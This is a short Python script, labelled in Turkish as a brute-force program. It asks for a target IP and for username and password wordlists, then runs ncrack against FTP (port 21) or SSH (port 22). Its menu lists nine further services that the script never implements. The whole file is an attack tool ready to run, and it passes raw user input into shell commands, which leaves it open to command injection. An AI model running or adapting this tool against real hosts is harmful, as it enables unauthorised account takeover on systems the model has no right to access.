#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Kaba Kuvvet")
print("""
Kaba Kuvvet  Programına Hoş Geldiniz. 

1) FTP
2) SSH
3) Telnet
4) HTTP
5) SMB
6) RDP
7) VNC
8) SIP
9) Redis
10) PostgreSQL
11)MySQL
""")

islemno = input("İşlem No Girin: ")
hedefip = input("Hedef İp Girin: ")
kullaniciadi = input("Kullanıcı Adı Dosya Yolu: ")
sifre = input("Sifrelerin Bulunduğu Dosya Yolu: ")

if(islemno == "1"):
	os.system("ncrack -p 21 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)

if(islemno == "2"):
	os.system("ncrack -p 22 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)
